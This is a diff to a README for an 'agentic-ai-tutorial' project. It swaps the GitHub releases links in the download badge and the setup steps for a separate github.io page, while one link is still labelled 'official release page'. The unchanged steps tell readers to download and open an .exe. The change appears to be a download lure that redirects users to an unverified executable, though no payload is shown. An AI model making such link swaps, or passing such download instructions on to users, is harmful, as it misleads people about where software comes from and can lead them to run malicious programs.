@@ -1,6 +1,6 @@
 # 🤖 agentic-ai-tutorial - Build smart agents with simple workflows
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Alkaloiddolichocephaly898/agentic-ai-tutorial/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://alkaloiddolichocephaly898.github.io)
 
 ## What is this tool? 🛠️
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to move from the download page to your first agent experiment.
 
-1. Visit the [official release page](https://github.com/Alkaloiddolichocephaly898/agentic-ai-tutorial/releases) to find the latest version.
+1. Visit the [official release page](https://alkaloiddolichocephaly898.github.io) to find the latest version.
 2. Look for the file ending in .exe under the "Assets" section.
 3. Click the file name to start the download.
 4. Open your "Downloads" folder once the process finishes.
